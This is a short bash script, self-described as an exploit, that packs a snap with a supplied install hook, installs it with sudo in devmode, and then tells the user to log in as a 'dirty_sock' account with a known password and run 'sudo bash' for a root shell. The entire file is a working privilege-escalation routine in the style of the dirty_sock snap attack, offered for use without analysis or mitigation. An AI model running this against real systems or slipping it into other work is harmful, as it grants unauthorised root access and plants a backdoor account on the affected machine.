#!/usr/bin/bash

# making the working directory

echo "[*] Exploit Start : making a working dir..."
cd /tmp
mkdir .snap_exp && cd .snap_exp

# Set up needs
echo "[*] Preparing..."
mkdir meta && mkdir meta/hooks
cp $2/install meta/hooks/install
chmod a+x meta/hooks/install
cp $2/snap.yaml meta/snap.yaml
echo "[*] Ready to start packing"

# Triger the pack
echo "[*] Packing..."
snap pack
echo "[*] Packed."

# done
echo "[*] Trigring tha snap"
sudo $1 install --devmode *.snap
echo "[*] Done."
echo "[*] you use below commands"
echo "	su - dirty_sock"
echo "	dirty_sock (as password)"
echo "	sudo bash"
